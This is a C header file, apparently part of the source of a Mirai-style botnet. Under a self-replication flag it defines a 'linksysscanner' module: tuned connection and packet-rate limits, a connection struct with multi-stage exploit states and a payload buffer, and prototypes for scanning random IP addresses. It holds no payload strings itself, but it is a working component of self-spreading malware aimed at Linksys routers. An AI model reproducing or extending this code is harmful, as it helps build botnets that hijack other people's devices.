#ifdef SELFREP
#pragma once
#include <stdint.h>
#include "includes.h"
#ifdef X86_64
#define linksysscanner_SCANNER_MAX_CONNS 512
#define linksysscanner_SCANNER_RAW_PPS 1440
#else
#define linksysscanner_SCANNER_MAX_CONNS 256
#define linksysscanner_SCANNER_RAW_PPS 1024
#endif

#ifdef X86_64
#define linksysscanner_SCANNER_RDBUF_SIZE 1024
#define linksysscanner_SCANNER_HACK_DRAIN 64
#else
#define linksysscanner_SCANNER_RDBUF_SIZE 1024
#define linksysscanner_SCANNER_HACK_DRAIN 64
#endif

struct linksysscanner_scanner_connection
{
    int fd, last_recv;
    enum
    {
        linksysscanner_SC_CLOSED,
        linksysscanner_SC_CONNECTING,
        linksysscanner_SC_EXPLOIT_STAGE2,
        linksysscanner_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[linksysscanner_SCANNER_RDBUF_SIZE];
    char payload_buf[2024];
};

void linksysscanner_scanner_init();
void linksysscanner_scanner_kill(void);

static void linksysscanner_setup_connection(struct linksysscanner_scanner_connection *);
static ipv4_t linksysscanner_get_random_ip(void);

#endif

